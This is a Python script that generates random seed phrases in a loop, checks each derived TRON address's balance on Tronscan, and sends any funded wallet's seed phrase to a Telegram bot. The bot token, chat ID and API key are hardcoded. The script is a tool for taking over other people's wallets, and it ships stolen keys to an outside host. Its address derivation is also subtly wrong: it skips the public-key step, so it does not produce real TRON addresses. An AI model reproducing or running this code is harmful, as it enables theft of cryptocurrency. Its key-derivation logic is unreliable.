import requests
from mnemonic import Mnemonic
import hashlib
import base58
import time

# توکن و آیدی تو
TELEGRAM_BOT_TOKEN = "8288543165:AAE2QnuOZFprB5XQ-h-ELCnt-y8kLv9OAqE"
TELEGRAM_CHAT_ID = "7573992508"

tronscan_api_key = "1f97bd4d-ef64-4e66-9790-51c2e558251d"
mnemo = Mnemonic("english")

def seed_to_tron_address(seed):
    try:
        priv = hashlib.pbkdf2_hmac("sha512", b"Bitcoin seed", seed, 2048)[:32]
        h1 = hashlib.sha256(priv).digest()
        h2 = hashlib.new('ripemd160', h1).digest()
        payload = b'\x41' + h2
        checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
        return base58.b58encode(payload + checksum).decode()
    except:
        return None

def check_balance(addr):
    try:
        r = requests.get(
            f"https://apilist.tronscan.org/api/account?address={addr}",
            headers={"TRON-PRO-API-KEY": tronscan_api_key},
            timeout=6
        ).json()
        return float(r.get("balance", 0)) / 1_000_000
    except:
        return 0.0

def send_to_telegram(addr, bal, phrase):
    message = f"""
TRON WALLET FOUND!
Address: `{addr}`
Balance: `{bal:.6f} TRX`
Seed Phrase (12 words):
`{phrase}`
"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, data=data, timeout=10)
        print("SENT TO TELEGRAM")
    except Exception as e:
        print(f"TELEGRAM SEND FAILED: {e}")

print("TRON SCANNER STARTED - CHECK TELEGRAM")
total = 0
found = 0

try:
    while True:
        total += 1
        phrase = mnemo.generate(128)
        seed = mnemo.to_seed(phrase)
        addr = seed_to_tron_address(seed)
        if not addr: continue

        bal = check_balance(addr)
        time.sleep(0.08)

        print(f"[{total:07d}] {addr} → {bal:.6f} TRX", end="")

        if bal > 0:
            found += 1
            print(f" FOUND #{found}")
            send_to_telegram(addr, bal, phrase)
        else:
            print("")

except KeyboardInterrupt:
    print(f"\nSTOPPED | Checked: {total} | Found: {found}")
